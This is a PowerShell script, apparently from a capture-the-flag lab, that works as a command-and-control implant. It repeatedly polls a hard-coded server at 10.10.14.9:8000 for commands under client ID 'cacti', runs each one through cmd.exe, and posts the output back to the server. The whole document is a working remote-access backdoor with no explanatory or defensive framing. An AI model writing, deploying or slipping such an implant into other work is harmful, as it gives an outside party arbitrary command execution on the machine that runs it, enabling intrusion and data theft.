# Define the URL for the command-and-control server and the client ID
$C2_URL = 'http://10.10.14.9:8000'
$CLIENT_ID = 'cacti'

# Function to send a request to the C2 server
function Send-Request {
    param (
        [string]$url,
        [string]$method = 'GET',
        [string]$body = ''
    )

    try {
        if ($method -eq 'GET') {
            $response = Invoke-RestMethod -Uri $url -Method Get
        } elseif ($method -eq 'POST') {
            $headers = @{ 'Content-Type' = 'application/json' }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
        }
        return $response
    } catch {
        Write-Error "Error: $_"
    }
}

# Main loop to keep checking for commands
while ($true) {
    try {
        $command = Send-Request "$C2_URL/command/$CLIENT_ID"

        if ($command) {
            if ($command -match 'terminate') {
                break
            }

            $output = cmd.exe /c $command 2>&1

            $json_data = @{ output = $output } | ConvertTo-Json
            Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
        }

        Start-Sleep -Seconds 5
    } catch {
        Write-Error "Error: $_"
        break
    }
}
